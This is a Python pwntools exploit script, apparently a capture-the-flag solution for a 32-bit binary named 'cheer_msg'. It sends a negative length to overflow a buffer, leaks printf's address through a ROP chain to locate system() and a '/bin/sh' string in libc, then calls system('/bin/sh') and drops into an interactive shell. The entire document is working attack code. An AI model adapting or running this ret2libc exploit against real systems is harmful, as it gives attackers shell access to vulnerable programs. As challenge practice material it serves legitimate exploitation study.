from pwn import *

#context.log_level = 'debug'
context.arch='i386'

LOCAL = True

if LOCAL:
	p = process('cheer_msg')
else:
	p = remote('127.0.0.1',10001)

elf = ELF('cheer_msg')
#libc = ELF('libc-2.19.so-c4dc1270c1449536ab2efbbe7053231f1a776368')
#local
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

def main():
	p.sendline('-152')
	p.recvuntil('Name >> ')
	#leak printf() address
	payload = p32(elf.symbols['printf']) +p32(elf.entry) +p32(elf.got['printf'])
	p.sendline(payload)

	p.recvuntil('Message : ')
	junk = p.recvline()
	leak_printf = u32(p.recvline()[:4])

	
	system_addr = leak_printf - (libc.symbols['printf'] - libc.symbols['system'])
	#for my local
	offset = 0x120a8b
	binsh = system_addr + offset
	log.success('printf addr : 0x%x' % leak_printf )
	log.success('systemaddr : 0x%x' % system_addr)
	log.success('/binsh addr : 0x%x' % binsh)

	p.sendline('-152')
	p.recvuntil('Name >> ')
	raw_input('$')
	payload = p32(system_addr) + "DEAD" + p32(binsh)

	p.sendline(payload)
	p.interactive()

if __name__ == '__main__':
	main()
